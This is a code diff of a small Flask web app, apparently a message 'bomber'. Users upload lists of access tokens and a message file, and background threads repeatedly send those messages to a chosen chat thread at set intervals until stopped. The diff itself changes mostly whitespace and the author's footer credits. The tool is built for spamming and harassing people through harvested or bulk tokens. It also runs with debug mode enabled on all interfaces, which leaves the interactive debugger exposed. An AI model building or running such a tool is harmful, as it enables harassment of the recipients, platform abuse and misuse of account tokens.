@@ -4,10 +4,10 @@ from threading import Thread, Event
 import time
 import random
 import string
-
+ 
 app = Flask(__name__)
 app.debug = True
-
+ 
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -19,10 +19,10 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
-
+ 
 stop_events = {}
 threads = {}
-
+ 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -39,34 +39,34 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
-
+ 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
-
+        
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
-
+ 
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
-
+ 
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
-
+ 
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
+ 
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
-
+ 
         return f'Task started with ID: {task_id}'
-
+ 
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
@@ -157,7 +157,7 @@ def send_message():
         <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
+      </form>
     <form method="post" action="/stop">
       <div class="mb-3">
         <label for="taskId" class="form-label">Enter Task ID to Stop</label>
@@ -167,8 +167,8 @@ def send_message():
     </form>
   </div>
   <footer class="footer">
-    <p>© 𝟐𝟎𝟐𝟒 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐒𝐇𝐀𝐇𝐁𝐀𝐙 𝐀𝐍𝐒𝐀𝐑𝐈</p>
-    <p> 😎𝐒𝐇𝐀𝐇𝐁𝐀𝐙 𝐀𝐍𝐒𝐀𝐑𝐈🌹 <a href="https://www.facebook.com/profile.php?id=100000261036663">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <p>© 2023 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ🥀✌️Shahbaz Ansari😈🐧</p>
+    <p> 😎𝐒𝐇𝐀𝐇𝐁𝐀𝐙 𝐀𝐍𝐒𝐀𝐑𝐈🌹<a href="https://https://www.facebook.com/profile.php?id=100000261036663">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
     <div class="mb-3">
       <a href="https://wa.me/+91" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
@@ -190,7 +190,7 @@ def send_message():
 </body>
 </html>
 ''')
-
+ 
 @app.route('/stop', methods=['POST'])
 def stop_task():
     task_id = request.form.get('taskId')
@@ -199,6 +199,6 @@ def stop_task():
         return f'Task with ID {task_id} has been stopped.'
     else:
         return f'No task found with ID {task_id}.'
-
+ 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
